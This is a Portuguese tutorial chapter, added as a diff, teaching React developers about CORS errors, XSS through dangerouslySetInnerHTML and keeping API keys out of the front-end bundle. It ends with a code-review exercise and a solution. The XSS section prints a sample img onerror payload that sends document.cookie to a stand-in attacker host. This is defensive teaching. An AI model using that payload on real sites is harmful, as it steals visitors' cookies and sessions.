@@ -1,0 +1,197 @@
+---
+title: CORS e Segurança no Front-end
+description: "Entenda o que é CORS, como interpretar seus erros no console, e as vulnerabilidades mais comuns que um front-end pode introduzir sem perceber."
+---
+
+Você já sabe fazer requisições, tratar status codes e modelar o estado de uma chamada de API com cuidado. Mas existe uma categoria de erro que não tem nada a ver com o seu código React, com `fetch` mal configurado ou com um `try/catch` esquecido — e que, mesmo assim, é extremamente comum durante o aprendizado: o erro de **CORS**. Ele costuma aparecer do nada, encher o console de vermelho, e gerar a sensação de "eu não fiz nada de errado" — o que, na maior parte das vezes, é verdade.
+
+## O que é CORS e por que ele existe
+
+Os navegadores seguem uma regra de segurança chamada **política de mesma origem** (*same-origin policy*): por padrão, uma página só pode fazer requisições **livremente** para o mesmo domínio, protocolo e porta de onde ela foi carregada. Uma página servida em `http://localhost:3000` é uma **origem** diferente de `https://api.forja.dev`, mesmo que ambas estejam rodando na sua própria máquina.
+
+Sem essa regra, qualquer site malicioso poderia usar o seu navegador — já autenticado em outros serviços — para fazer requisições silenciosas em seu nome para bancos, redes sociais, e-mails, e ler as respostas. A política de mesma origem existe para impedir exatamente isso.
+
+O problema é que, no desenvolvimento web moderno, é **normalíssimo** que o front-end (rodando em `localhost:3000`, ou em `app.forja.dev`) precise conversar com um back-end em outra origem (`api.forja.dev`, ou uma API pública de terceiros). É aí que entra o **CORS** (*Cross-Origin Resource Sharing*) — um mecanismo que permite ao **servidor** dizer explicitamente, através de cabeçalhos HTTP, quais origens têm permissão de ler suas respostas.
+
+Um servidor que aceita requisições de qualquer origem responde com um cabeçalho como este:
+
+```
+Access-Control-Allow-Origin: *
+```
+
+Ou, de forma mais restrita, permitindo apenas uma origem específica:
+
+```
+Access-Control-Allow-Origin: https://app.forja.dev
+```
+
+<Callout>
+  CORS é uma decisão **do servidor**, não do seu código front-end. Não existe nenhuma configuração no seu componente React, no `fetch` ou no `axios` que "resolva" um problema de CORS de verdade — porque quem decide se a resposta pode ser lida é o servidor que a enviou, através desse cabeçalho.
+</Callout>
+
+## Como interpretar um erro de CORS no console
+
+Quando uma API não autoriza a sua origem, o navegador **bloqueia a leitura da resposta** e imprime uma mensagem parecida com esta no console:
+
+```
+Access to fetch at 'https://api.exemplo.com/gastos' from origin 'http://localhost:3000'
+has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on
+the requested resource.
+```
+
+Repare no que essa mensagem realmente diz: o servidor **não incluiu** o cabeçalho `Access-Control-Allow-Origin` na resposta (ou incluiu um valor que não corresponde à sua origem). O navegador, por segurança, recusa entregar essa resposta para o seu JavaScript — mesmo que a requisição em si possa ter chegado ao servidor normalmente.
+
+Esse último ponto é sutil e engana muita gente: para requisições **simples** (como um `GET` sem cabeçalhos customizados), o navegador **envia a requisição de verdade**, e o servidor pode até processá-la — o bloqueio acontece só na hora de entregar a resposta para o seu código. Já para requisições consideradas "não simples" — como um `POST` com corpo JSON, ou qualquer requisição com cabeçalhos customizados (por exemplo, `Authorization`) — o navegador primeiro envia uma requisição de checagem, chamada **preflight**, usando o método `OPTIONS`, perguntando ao servidor "você aceita isso?" antes de mandar a requisição real. Se o servidor não responder ao preflight com as permissões corretas, a requisição real **nunca chega a ser enviada**.
+
+Diante de um erro de CORS, os passos úteis são:
+
+1. **Confirme que a URL está correta.** Um erro de digitação na URL às vezes se disfarça de erro de CORS.
+2. **Verifique se o problema também acontece fora do seu código** — por exemplo, testando a mesma URL em uma ferramenta como Postman/Insomnia (que não aplica política de mesma origem, porque não é um navegador).
+3. **Lembre-se que a correção é do lado do servidor.** Se você tem acesso ao back-end, o ajuste é configurar os cabeçalhos de CORS ali. Se a API é de terceiros e não te dá essa opção, pode ser necessário um proxy no seu próprio back-end para intermediar a chamada.
+
+<Callout type="warn">
+  Extensões de navegador que "desativam CORS" ou ferramentas que injetam `Access-Control-Allow-Origin: *` no seu navegador local são, no melhor caso, um atalho de desenvolvimento — nunca uma solução. Elas alteram o comportamento apenas na sua máquina, escondendo um problema que vai continuar existindo para qualquer outra pessoa que acessar sua aplicação normalmente. Nunca dependa disso para produção.
+</Callout>
+
+## XSS: quando dados viram código
+
+**XSS** (*Cross-Site Scripting*) é uma das vulnerabilidades mais comuns — e mais fáceis de introduzir sem perceber — em aplicações front-end. Ela acontece quando **dados que vêm de fora** (de um usuário, de uma API, de um parâmetro de URL) são renderizados na página como se fossem **código confiável**, permitindo que alguém injete um script malicioso que roda no navegador de outras pessoas.
+
+React, por padrão, te protege bem disso: quando você escreve `{variavel}` dentro de um JSX, o React **escapa** o conteúdo automaticamente, tratando-o sempre como texto simples:
+
+```tsx
+function Comentario({ texto }: { texto: string }) {
+  return <p>{texto}</p>;
+  // Mesmo que "texto" contenha algo como <script>alert('oi')</script>,
+  // o React renderiza isso como texto visível na tela, não como HTML executável.
+}
+```
+
+O problema aparece quando você usa `dangerouslySetInnerHTML` — uma propriedade do React que, como o próprio nome já avisa, insere HTML diretamente no DOM, **sem escapar nada**:
+
+```tsx
+function ComentarioPerigoso({ texto }: { texto: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: texto }} />;
+}
+```
+
+Se `texto` vier de um usuário e contiver algo como:
+
+```html
+<img src="x" onerror="fetch('https://atacante.com/roubar?cookie=' + document.cookie)">
+```
+
+Esse código **executa de verdade** no navegador de quem visualizar aquele comentário — podendo roubar tokens, cookies, ou fazer requisições em nome da vítima, sem que ela perceba nada.
+
+<Callout type="warn">
+  Use `dangerouslySetInnerHTML` apenas quando for **estritamente necessário** (por exemplo, renderizar HTML vindo de um editor de texto rico que seu próprio backend já sanitiza) — e, mesmo assim, sanitize o conteúdo antes com uma biblioteca especializada, como `DOMPurify`, em vez de confiar cegamente no dado recebido:
+
+  ```tsx
+  import DOMPurify from "dompurify";
+
+  function ComentarioSeguro({ texto }: { texto: string }) {
+    const textoLimpo = DOMPurify.sanitize(texto);
+    return <div dangerouslySetInnerHTML={{ __html: textoLimpo }} />;
+  }
+  ```
+</Callout>
+
+## Vazamento de chaves e segredos no bundle
+
+Todo código que você escreve para o front-end — incluindo variáveis, strings e chamadas de API — é **compilado em arquivos JavaScript que são enviados para o navegador de qualquer pessoa** que acessar sua aplicação. Isso significa que **nada no seu front-end é secreto**: qualquer pessoa pode abrir as ferramentas de desenvolvedor, olhar a aba "Sources" ou simplesmente usar "Exibir código-fonte" e ler tudo o que seu bundle contém.
+
+```ts
+// NUNCA faça isso em código que roda no navegador:
+const chaveSecreta = "sk_live_51H8xJ2eZv...";
+
+async function buscarDados() {
+  const resposta = await fetch(`https://api.terceiro.com/dados?key=${chaveSecreta}`);
+  return resposta.json();
+}
+```
+
+Mesmo que essa chave venha de uma variável de ambiente, se ela acabar dentro do código que roda no navegador, ela está exposta. Ferramentas de build como Vite e Next.js até diferenciam variáveis "públicas" de "privadas" por convenção (por exemplo, `NEXT_PUBLIC_*` no Next.js, ou `VITE_*` no Vite) — mas essa convenção existe justamente para **avisar** que tudo com esse prefixo será embutido no bundle e ficará visível. Uma variável sem esse prefixo simplesmente não fica acessível no código do navegador — o que é ótimo, mas também significa que ela nunca deveria ser necessária ali.
+
+Se sua aplicação precisa usar uma chave secreta (de uma API paga, por exemplo), a chave **nunca** deve viajar até o navegador. O padrão correto é o front-end chamar o **seu próprio backend**, e é o backend — rodando em um servidor que você controla, fora do alcance do usuário — quem guarda a chave e faz a chamada para o serviço de terceiros.
+
+## Boas práticas de segurança no lado do cliente
+
+Alguns princípios simples evitam a maioria dos problemas de segurança que se originam no front-end:
+
+- **Nunca confie só na validação de front-end.** Um formulário que impede o envio de um valor negativo, ou de um e-mail inválido, melhora a experiência de quem usa a aplicação normalmente — mas não impede ninguém de abrir o DevTools, remover o `required` do HTML, ou simplesmente chamar a API diretamente com `curl` ou Postman, ignorando seu formulário por completo. **A validação que realmente protege o sistema é sempre a do servidor.**
+- **Sanitize dados exibidos que vieram de fora**, especialmente se forem renderizados como HTML. Prefira sempre a renderização padrão do React (`{variavel}`) e reserve `dangerouslySetInnerHTML` + sanitização para os casos em que HTML de verdade precisa ser exibido.
+- **Nunca guarde segredos no bundle do front-end** — nem chaves de API pagas, nem senhas, nem tokens de serviços internos. Se um valor precisa ficar secreto, ele pertence ao backend.
+- **Trate toda entrada externa como não confiável**, seja ela digitada por um usuário, recebida de uma API, ou lida de um parâmetro de URL — nenhuma dessas fontes está sob seu controle direto.
+
+<Callout>
+  Um bom teste mental: se alguém copiasse **todo** o conteúdo que seu navegador baixa para carregar a página (HTML, CSS, JavaScript, tudo), essa pessoa teria acesso a algo que deveria ser secreto? Se a resposta for sim, esse dado está no lugar errado.
+</Callout>
+
+## Para praticar
+
+**Cenário:** Durante uma revisão de código no dashboard de finanças, você encontra dois trechos suspeitos, escritos por um colega apressado.
+
+**Requisitos:**
+
+1. Reescreva o componente abaixo para que ele **não** use `dangerouslySetInnerHTML`, já que a descrição do gasto é sempre texto simples digitado pelo usuário, sem necessidade de HTML:
+
+   ```tsx
+   function DescricaoDoGasto({ descricao }: { descricao: string }) {
+     return <span dangerouslySetInnerHTML={{ __html: descricao }} />;
+   }
+   ```
+
+2. Identifique o problema de segurança no trecho abaixo e reescreva-o, movendo a chamada para um backend próprio (pode ser pseudocódigo do endpoint) em vez de expor a chave no front-end:
+
+   ```ts
+   const CHAVE_API_TERCEIRO = "sk_live_abc123";
+
+   async function buscarRelatorioFinanceiro(usuarioId: string) {
+     const resposta = await fetch(
+       `https://api.relatorios.com/gerar?usuario=${usuarioId}&key=${CHAVE_API_TERCEIRO}`
+     );
+     return resposta.json();
+   }
+   ```
+
+3. Escreva, em um comentário no código, uma frase explicando **por que** cada uma das duas correções resolve o problema.
+
+<details>
+  <summary>Clique para ver uma possível solução</summary>
+
+```tsx
+// 1. A descrição do gasto é sempre texto simples — não precisa (e não deve)
+// ser tratada como HTML. Usar a renderização padrão do React já escapa
+// qualquer conteúdo malicioso automaticamente, eliminando o risco de XSS.
+function DescricaoDoGasto({ descricao }: { descricao: string }) {
+  return <span>{descricao}</span>;
+}
+```
+
+```ts
+// 2. A chave da API de terceiro nunca deveria existir em código que roda
+// no navegador — qualquer pessoa pode abrir o DevTools e copiá-la.
+// A correção move a chamada (e a chave) para o backend próprio, que o
+// front-end acessa sem nunca ver o segredo.
+
+// No front-end:
+async function buscarRelatorioFinanceiro(usuarioId: string) {
+  const resposta = await fetch(`https://api.forja.dev/relatorios/${usuarioId}`);
+  return resposta.json();
+}
+
+// No backend (pseudocódigo, roda em um servidor, nunca no navegador):
+// app.get("/relatorios/:usuarioId", async (req, res) => {
+//   const chave = process.env.CHAVE_API_TERCEIRO; // fica só no servidor
+//   const dados = await fetch(
+//     `https://api.relatorios.com/gerar?usuario=${req.params.usuarioId}&key=${chave}`
+//   );
+//   res.json(await dados.json());
+// });
+```
+
+</details>
+
+---
+
+Você já sabe reconhecer um erro de CORS pelo que ele realmente é (uma decisão do servidor, não um bug seu), e já sabe evitar as vulnerabilidades mais comuns que um front-end introduz sem querer. Falta uma peça central para fechar este módulo: como saber **quem** está usando sua aplicação. É disso que trata a autenticação — o assunto do próximo capítulo.
